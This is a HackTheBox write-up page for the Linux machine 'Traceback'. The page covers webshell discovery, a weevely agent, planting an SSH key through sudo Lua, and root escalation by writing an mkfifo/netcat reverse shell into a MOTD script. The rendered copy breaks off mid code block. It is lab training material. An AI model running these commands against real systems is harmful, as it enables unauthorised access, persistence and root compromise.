<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Traceback | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Traceback HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/traceback/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/traceback/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Traceback "><meta property="og:description" content="Traceback HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/traceback/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/traceback/traceback.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-08-15T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/traceback/traceback.png"><meta name=twitter:title content="Traceback "><meta name=twitter:description content="Traceback HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Traceback ","item":"https://s4ch.github.io/writeups/hackthebox/traceback/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Traceback ","name":"Traceback ","description":"Traceback HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Traceback Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview TL;DR: finding \u0026 abusing a PHP webshell to get system access, then pe to another user with lua (sudo) and finally pe to root with a motd partial script.\nInstall tools used in this WU on BlackArch Linux:\n1 pacman -S nmap gtfo dirsearch weevely Network enumeration Start a full port scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Nmap 7.80 scan initiated Sun Mar 15 16:33:24 2020 as: nmap -sSCV -p 80,22 -oA nmap_services 10.10.10.181 Nmap scan report for 10.10.10.181 Host is up (0.025s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 15 16:35:12 2020 -- 1 IP address (1 host up) scanned in 108.17 seconds HTTP discovery On the main page source code http://10.10.10.181/\n1 2 3 4 \u003ch1\u003eThis site has been owned\u003c/h1\u003e \u003ch2\u003eI have left a backdoor for all the net. FREE INTERNETZZZ\u003c/h2\u003e \u003ch3\u003e - Xh4H - \u003c/h3\u003e It’s a hint telling us to search for web shells.\nHTTP enumeration We will try to find a web shell by enumerating available pages with dirsearch. Of course it’s better to take a webshell focused dictionary for that.\n1 2 3 4 5 6 7 8 9 10 $ dirsearch -u http://10.10.10.181/ -e php -w ~/CTF/tools/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 80 Error Log: /home/cyfun/.dirsearch/logs/errors-20-03-15_16-24-24.log Target: http://10.10.10.181/ But I found no web shell with this dictionary.\nA bit of OSINT The challenge’s author is Xh4H. We can find it’s github profile and find a project named Web-Shells storing some common and more exotic PHP web shells.\nSo let’s use this as a list.\nFinally we found a webshell called smevk.php.\nhttp://10.10.10.181/smevk.php\nHTTP exploitation With the webshell we can display files like /etc/passwd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin webadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin sysadmin:x:1001:1001::/home/sysadmin:/bin/sh The webshell is a cancer, so let’s create \u0026 upload our own made with weevely.\nCreate teh webshell agent:\n1 2 $ weevely generate cyfun agentcyfun.php Generated 'agentcyfun.php' with password 'cyfun' of 781 byte size. Upload the agent (a classic HTTP server + wget). Trigger the webshell agent:\n1 2 3 4 5 6 7 8 9 10 11 12 $ weevely terminal http://10.10.10.181/agentcyfun.php cyfun [+] weevely 4.0.1 [+] Target: 10.10.10.181 [+] Session: /home/cyfun/.weevely/sessions/10.10.10.181/agentcyfun_0.session [+] Browse the filesystem or execute commands starts the connection [+] to the target. Type :help for more information. weevely\u003e id uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) System enumeration Then start some system enumeration.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 webadmin@traceback:/var/www/html $ ls -lhRA /home /home: total 8.0K drwxr-x--- 5 sysadmin sysadmin 4.0K Mar 15 09:07 sysadmin drwxr-x--- 5 webadmin sysadmin 4.0K Mar 15 09:08 webadmin ls: cannot open directory '/home/sysadmin': Permission denied /home/webadmin: total 4.3M -rw------- 1 webadmin webadmin 90 Feb 27 05:53 .bash_history -rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 webadmin webadmin 3.7K Aug 23 2019 .bashrc drwx------ 2 webadmin webadmin 4.0K Aug 23 2019 .cache drwxrwxr-x 3 webadmin webadmin 4.0K Aug 24 2019 .local -rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history -rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profile drwxrwxr-x 2 webadmin webadmin 4.0K Feb 27 06:29 .ssh -rwxrw-r-- 1 webadmin webadmin 870 Mar 15 09:05 cc.lua -rwxrw-r-- 1 webadmin webadmin 332 Mar 15 09:02 ccc.lua -rw-rw-rw- 1 webadmin webadmin 672 Mar 15 08:49 heli.lua -rw-r--r-- 1 webadmin webadmin 672 Mar 15 09:04 krisis.lua -rwxrwxr-x 1 sysadmin sysadmin 4.2M Aug 24 2019 luvit -rw-rw-r-- 1 webadmin webadmin 89 Aug 24 2019 note.txt -rw-r--r-- 1 webadmin webadmin 654 Mar 15 09:02 nowy.lua -rw-rw-r-- 1 webadmin webadmin 648 Mar 15 09:06 privesc.lua -rw-rw-r-- 1 webadmin webadmin 673 Mar 15 09:03 rs.lua -rw-r--r-- 1 webadmin webadmin 332 Mar 15 09:02 shell.lua -rw-r--r-- 1 webadmin webadmin 655 Mar 15 09:08 ssh.lua -rw-rw-rw- 1 webadmin webadmin 29 Mar 15 09:06 test.lua /home/webadmin/.cache: total 0 -rw-r--r-- 1 webadmin webadmin 0 Aug 23 2019 motd.legal-displayed /home/webadmin/.local: total 4.0K drwx------ 3 webadmin webadmin 4.0K Aug 24 2019 share /home/webadmin/.local/share: total 4.0K drwx------ 2 webadmin webadmin 4.0K Aug 24 2019 nano /home/webadmin/.local/share/nano: total 0 /home/webadmin/.ssh: total 4.0K -rw------- 1 webadmin webadmin 1.7K Mar 15 09:06 authorized_keys webadmin@traceback:/var/www/html $ cat /home/webadmin/note.txt - sysadmin - I have left this tool to practice Lua. Contact me if you have any question. We can see a bunch of lua scripts and a hint telling us to use lua.\nWe can edit /home/webadmin/.ssh/authorized_keys and add pubkey to gain persistence \u0026 access a proper TTY rather than a webshell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch $ ssh webadmin@10.10.10.181 -i ~/.ssh/id_rsa The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established. ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts. ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 15 09:14:09 2020 from 10.10.15.22 webadmin@traceback:~$ We can see that we can run a command luvit as sysadmin:\n1 2 3 4 5 6 7 8 9 10 webadmin@traceback:~$ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/webadmin/luvit webadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit Welcome to the Luvit repl! \u003e Privilege Escalation of Machine : webadmin to sysadmin luvit is just a wrapper opening a lua interpreter.\nLet’s create a LUA PoC to pe.\nWe can use gtfo to search over GTFObins.\n1 $ gtfo -b lua With lua it’s possible to open a shell directly with os.execute(\"/bin/bash\") or to write our SSH key to get persistence:\n1 2 3 local file = io.open(\"/home/sysadmin/.ssh/authorized_keys\", \"a\") file:write(\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch\") file:close() We have just to execute the lua interpreter as sysadmin and paste our lua PoC.\n1 webadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit cyfun.lua Then we can log in as sysadmin over ssh \u0026 get the user flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 15 09:42:11 2020 from 10.10.14.76 $ cat user.txt c24349701ae38c33ffbf0cceb2c46020 Privilege Escalation of Machine : sysadmin to root We can see that the MOTD directory is writable by sysadmin.\n1 2 3 4 5 6 7 sysadmin@traceback:~$ ls -lh /etc/update-motd.d total 24K -rwxrwxr-x 1 root sysadmin 981 Mar 15 10:46 00-header -rwxrwxr-x 1 root sysadmin 982 Mar 15 10:46 10-help-text -rwxrwxr-x 1 root sysadmin 4.2K Mar 15 10:46 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Mar 15 10:46 80-esm -rwxrwxr-x 1 root sysadmin 299 Mar 15 10:46 91-release-upgrade Owned by root but writable by sysadmin so we can add any command in it. But it seems there are reset pretty often so we can do an infinite loop to append our reverse shell to /etc/update-motd.d/00-header indefinitely.\n1 2 3 4 while true do echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.44 9999 \u003e/tmp/f' \u003e\u003e /etc/update-motd.d/00-header done Launch a new connection ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa that will trigger the reverse shell as root and gain access with a listener:\n1 2 3 4 $ nc -nlp 9999 id /bin/sh: 0: can't access tty; job control turned off # uid=0(root) gid=0(root) groups=0(root) ","wordCount":"1434","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/traceback/traceback.png","datePublished":"2020-08-15T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/traceback/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Traceback</h1><div class=post-description>Traceback HackTheBox writeup</div><div class=post-meta><span title='2020-08-15 00:00:00 +0000 UTC'>August 15, 2020</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1434 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/traceback/traceback.png alt="Traceback HackTheBox Machine"><p>Traceback - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#a-bit-of-osint>A bit of OSINT</a></li><li><a href=#http-exploitation>HTTP exploitation</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation-of-machine--webadmin-to-sysadmin>Privilege Escalation of Machine : webadmin to sysadmin</a></li><li><a href=#privilege-escalation-of-machine--sysadmin-to-root>Privilege Escalation of Machine : sysadmin to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Traceback</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/233>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: finding & abusing a PHP webshell to get system access, then pe to
another user with lua (sudo) and finally pe to root with a motd partial script.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pacman -S nmap gtfo dirsearch weevely
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Start a full port scan with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Sun Mar 15 16:33:24 2020 as: nmap -sSCV -p 80,22 -oA nmap_services 10.10.10.181
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.181
</span></span><span class=line><span class=cl>Host is up (0.025s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey: 
</span></span><span class=line><span class=cl>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
</span></span><span class=line><span class=cl>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
</span></span><span class=line><span class=cl>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http?
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Sun Mar 15 16:35:12 2020 -- 1 IP address (1 host up) scanned in 108.17 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>On the main page source code http://10.10.10.181/</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>This site has been owned<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span> - Xh4H - <span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s a hint telling us to search for web shells.</p><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>We will try to find a web shell by enumerating available pages with
<a href=https://github.com/maurosoria/dirsearch>dirsearch</a>. Of course it&rsquo;s better to take a webshell focused
dictionary for that.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>dirsearch</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.181</span><span class=o>/</span> <span class=o>-</span><span class=n>e</span> <span class=n>php</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>CommonBackdoors</span><span class=o>-</span><span class=n>PHP</span><span class=o>.</span><span class=n>fuzz</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=n>_</span><span class=o>|.</span> <span class=n>_</span> <span class=n>_</span>  <span class=n>_</span>  <span class=n>_</span>  <span class=n>_</span> <span class=n>_</span><span class=o>|</span><span class=n>_</span>    <span class=n>v0</span><span class=o>.</span><span class=mf>3.9</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>_</span><span class=o>|||</span> <span class=n>_</span><span class=p>)</span> <span class=p>(</span><span class=o>/</span><span class=n>_</span><span class=p>(</span><span class=n>_</span><span class=o>||</span> <span class=p>(</span><span class=n>_</span><span class=o>|</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Extensions</span><span class=p>:</span> <span class=n>php</span> <span class=o>|</span> <span class=n>HTTP</span> <span class=n>method</span><span class=p>:</span> <span class=n>get</span> <span class=o>|</span> <span class=n>Threads</span><span class=p>:</span> <span class=mi>10</span> <span class=o>|</span> <span class=n>Wordlist</span> <span class=n>size</span><span class=p>:</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Error</span> <span class=n>Log</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/.</span><span class=n>dirsearch</span><span class=o>/</span><span class=n>logs</span><span class=o>/</span><span class=n>errors</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=mi>15</span><span class=n>_16</span><span class=o>-</span><span class=mi>24</span><span class=o>-</span><span class=mf>24.</span><span class=n>log</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Target</span><span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.181</span><span class=o>/</span>
</span></span></code></pre></td></tr></table></div></div><p>But I found no web shell with this dictionary.</p><h2 id=a-bit-of-osint>A bit of OSINT<a hidden class=anchor aria-hidden=true href=#a-bit-of-osint>#</a></h2><p>The challenge&rsquo;s author is <strong>Xh4H</strong>. We can find it&rsquo;s <a href=https://github.com/Xh4H>github profile</a>
and find a project named <a href=https://github.com/Xh4H/Web-Shells>Web-Shells</a>
storing some common and more exotic PHP web shells.</p><p>So let&rsquo;s use this as a list.</p><p>Finally we found a webshell called <code>smevk.php</code>.</p><p><code>http://10.10.10.181/smevk.php</code></p><h2 id=http-exploitation>HTTP exploitation<a hidden class=anchor aria-hidden=true href=#http-exploitation>#</a></h2><p>With the webshell we can display files like <code>/etc/passwd</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
